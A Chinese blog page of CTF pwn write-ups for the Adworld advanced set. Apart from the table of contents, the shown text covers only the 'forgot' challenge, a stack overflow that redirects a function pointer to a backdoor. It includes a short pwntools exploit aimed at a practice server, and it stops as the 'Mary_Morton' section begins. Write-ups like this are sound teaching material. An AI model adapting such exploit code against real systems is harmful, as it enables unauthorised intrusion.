  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Lsh</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94pwn%E8%BF%9B%E9%98%B6"><span class="nav-number">1.</span> <span class="nav-text">攻防世界——pwn进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%88%86%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">三分题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-forgot"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. forgot</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Mary-Morton"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-warmup"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. warmup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-welpwn"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. welpwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-2"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-monkey"><span class="nav-number">1.1.5.</span> <span class="nav-text">5. monkey</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-time-formatter"><span class="nav-number">1.1.6.</span> <span class="nav-text">6. time_formatter</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-3"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-pwn-200"><span class="nav-number">1.1.7.</span> <span class="nav-text">7. pwn-200</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-4"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-pwn1"><span class="nav-number">1.1.8.</span> <span class="nav-text">8. pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-5"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-5"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E5%88%86%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">四分题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-note-service2"><span class="nav-number">1.2.1.</span> <span class="nav-text">9. note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-6"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-6"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-pwn-100"><span class="nav-number">1.2.2.</span> <span class="nav-text">10. pwn-100</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-7"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-7"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6"><span class="nav-number">1.2.3.</span> <span class="nav-text">11. 反应釜开关控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-8"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-8"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B"><span class="nav-number">1.2.4.</span> <span class="nav-text">12. 实时数据监测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-9"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-9"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-dice-game"><span class="nav-number">1.2.5.</span> <span class="nav-text">13. dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-10"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-10"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-satck2"><span class="nav-number">1.2.6.</span> <span class="nav-text">14. satck2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-11"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-11"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-greeting-150"><span class="nav-number">1.2.7.</span> <span class="nav-text">16. greeting-150</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-12"><span class="nav-number">1.2.7.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-12"><span class="nav-number">1.2.7.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-secret-file"><span class="nav-number">1.2.8.</span> <span class="nav-text">17. secret_file</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-13"><span class="nav-number">1.2.8.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-13"><span class="nav-number">1.2.8.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E5%88%86%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">五分题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#18-supermarket"><span class="nav-number">1.3.1.</span> <span class="nav-text">18. supermarket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-14"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-14"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-noleak"><span class="nav-number">1.3.2.</span> <span class="nav-text">19. noleak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-15"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-15"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-babyfengshui"><span class="nav-number">1.3.3.</span> <span class="nav-text">20. babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-16"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-16"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-dubblesort"><span class="nav-number">1.3.4.</span> <span class="nav-text">21. dubblesort</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-17"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-17"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-RCalc"><span class="nav-number">1.3.5.</span> <span class="nav-text">22. RCalc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-18"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%86%E6%9E%90"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">思路及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-Aul"><span class="nav-number">1.3.6.</span> <span class="nav-text">23. Aul</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-1000levevls"><span class="nav-number">1.3.7.</span> <span class="nav-text">24. 1000levevls</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-19"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-18"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-format2"><span class="nav-number">1.3.8.</span> <span class="nav-text">25. format2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-20"><span class="nav-number">1.3.8.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-19"><span class="nav-number">1.3.8.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-4-ReeHY-main-100"><span class="nav-number">1.3.9.</span> <span class="nav-text">26. 4-ReeHY-main-100</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-21"><span class="nav-number">1.3.9.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-20"><span class="nav-number">1.3.9.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E5%88%86%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">六分题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#27-echo-back"><span class="nav-number">1.4.1.</span> <span class="nav-text">27. echo_back</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-22"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-21"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#28-HMI%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C"><span class="nav-number">1.4.2.</span> <span class="nav-text">28. HMI流水灯运行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-23"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-22"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#29-easyfmt"><span class="nav-number">1.4.3.</span> <span class="nav-text">29. easyfmt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-24"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-23"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#30-hacknote"><span class="nav-number">1.4.4.</span> <span class="nav-text">30. hacknote</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-25"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-24"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#31-250"><span class="nav-number">1.4.5.</span> <span class="nav-text">31. 250</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-26"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%86%E6%9E%90-1"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">思路及分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E5%88%86%E9%A2%98"><span class="nav-number">1.5.</span> <span class="nav-text">七分题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32-house-of-grey"><span class="nav-number">1.5.1.</span> <span class="nav-text">32. house_of_grey</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-27"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-25"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#33-easypwn"><span class="nav-number">1.5.2.</span> <span class="nav-text">33. easypwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-28"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-26"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B2%81%E6%9C%AB%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">岁末赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-js"><span class="nav-number">2.1.1.</span> <span class="nav-text">ez_js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re"><span class="nav-number">2.2.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">2.2.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zzzz3333333"><span class="nav-number">2.2.2.</span> <span class="nav-text">zzzz3333333</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">2.3.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">2.3.1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2"><span class="nav-number">2.3.2.</span> <span class="nav-text">pwn2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-number">2.3.3.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn4"><span class="nav-number">2.3.4.</span> <span class="nav-text">pwn4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn5"><span class="nav-number">2.3.5.</span> <span class="nav-text">pwn5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn6"><span class="nav-number">2.3.6.</span> <span class="nav-text">pwn6</span></a></li></ol></li></ol></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ykx</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/5600bec/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ykx">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lsh">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          攻防世界pwn进阶
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-11-23 09:09:48" itemprop="dateCreated datePublished" datetime="2020-11-23T09:09:48+08:00">2020-11-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-02-01 17:09:28" itemprop="dateModified" datetime="2021-02-01T17:09:28+08:00">2021-02-01</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
<a id="more"></a>

<h2 id="三分题"><a href="#三分题" class="headerlink" title="三分题"></a>三分题</h2><h3 id="1-forgot"><a href="#1-forgot" class="headerlink" title="1. forgot"></a>1. forgot</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png" alt="image-20201220180827121"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png" alt="image-20201216091450390"></p>
<p><strong>考察知识点：栈溢出</strong></p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091522087.png" alt="image-20201216091522087"></p>
<p>发现scanf是一个溢出点，没有限制输入的大小。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091600591.png" alt="image-20201216091600591">在主函数的最后是调用调用 (指针v3 + (v14 - 1))所指向的函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091711987.png" alt="image-20201216091711987"></p>
<p>整个for循环控制v14的值。</p>
<p>查看其他函数，发现一个后门函数。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091815706.png" alt="image-20201216091815706"></p>
<h4 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>显然，目标就是执行后门函数。联想到v2可以溢出，那么第一个想法就是v2能否溢出修改v3的值。查看栈的结构，发现v2是可以溢出修改v3的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092006005.png" alt="image-20201216092006005"></p>
<p>接下来考虑v14的值，如果v14是1，那么就直接执行v3指向的函数，这是最方便的。要使v14为1，就需要不满足下列条件。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092221627.png" alt="image-20201216092221627"></p>
<p>“A”不符合条件。</p>
<p>没有开启pie，那么可以直接通过ida确定shell函数的地址。</p>
<p>最后编写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">42685</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(<span class="number">0x80486CC</span>)<span class="comment">#v2与v3距离0x20</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>)<span class="comment">#第一次输入无所谓</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093640287.png" alt="image-20201216093640287"></p>
<h3 id="2-Mary-Morton"><a href="#2-Mary-Morton" class="headerlink" title="2. Mary_Morton"></a>2. Mary_Morton</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180854344.png" alt="image-20201220180854344"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093833219.png" alt="image-20201216093833219"></p>
<p>开启了canary。</p>
<p><strong>考察知识点：格式化字符串、canary绕过、栈溢出</strong></p>
